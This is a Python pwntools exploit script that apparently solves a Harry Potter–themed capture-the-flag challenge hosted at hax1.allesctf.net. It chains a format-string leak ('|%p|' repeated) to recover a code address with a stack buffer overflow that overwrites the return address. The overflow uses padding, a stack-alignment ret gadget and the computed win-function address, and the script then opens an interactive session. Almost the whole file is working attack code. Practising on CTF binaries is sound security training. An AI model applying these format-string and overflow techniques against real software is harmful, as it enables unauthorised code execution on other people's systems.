from pwn import *

HOST = 'hax1.allesctf.net'
PORT = '9100'

#r = remote('localhost','9100')
p = remote(HOST,PORT)
#p = process("./pwn1")

def remoteExploit():
    r = remote(HOST,PORT)

# leak a code address from the stack and use known offsets to calculate the WIN address
def leakAddresses():
    #witchNameQuestion = p.recvuntil('Enter your witch name:\n')
    #print(witchNameQuestion)
    formatStringAttack = (65-26)*"|%p|"
    p.sendlineafter('Enter your witch name:\n', formatStringAttack)
    stackDump = p.recvuntil(" enter your magic spell:\n")
    print(stackDump.decode('UTF-8'))
    #print(stackDump)
    stackDumpArray = stackDump.split(b"|")

    #get the last element 
    mainAddr = stackDumpArray[-2]
    #print(mainAddr)

    #calculate difference of WINgardium function and main instruction at addr mainAddr
    #this can be calculated with gdb
    print("Address of instruction in main function: {}".format(mainAddr.decode()))
    winAdr =  int(mainAddr.decode(),16) - 0x135
    return winAdr

# use the winAdr to overwrite the return address from AAAAAAAAA()
def localExploit(winAdr,offsetSize):
    #raw_input("wait for gdb") 
    #leviosaAdr = pack(0x00005555555549ec, 64, 'little', False)
    payload = b"Expelliarmus\x00"
    #payload += cyclic(offsetSize)
    payload += offsetSize*b'A'
    #also push a pop/ret/push instruction on the stack to align the stack (the win function contains a ret instruction at winAdr+0x36)
    payload += p64(winAdr+0x36)
    payload += p64(winAdr)

    print(payload)
    p.sendline(payload)
    #print(p.recvuntil("-10 Points for Hufflepuff!\n").decode('utf-8'))
    print(p.recvuntil("~ Protego!\n").decode('utf-8'))
    p.interactive()

def findOffset():

    c = "Expelliarmus\x00"+cyclic(0x2ff).decode()

    #start gdb 
    io = gdb.debug('./pwn1', '''
        break main
        continue
    ''')
    #p.recvuntil("Enter your witch name:\n")
    #send our cyclic input
    io.sendline(c)

    #interactive to keep the process alive
    io.interactive()

    #result:
    # "cnaa" is on top of the stack when the binary crashes -> use cyclic_find to get offset for the bufferoverflow
    return int(hex(cyclic_find("cnaa")),16)
    # so offset for the buffer overflow is 0xfb

if __name__=='__main__':
    #start gdb to get the offset for the buffer overflow
    #offset = findOffset()
    offset = int(hex(cyclic_find("cnaa")),16)

    winAdr = leakAddresses()
    print("calculated WIN address: {}".format(hex(winAdr)))

    localExploit(winAdr, offset)
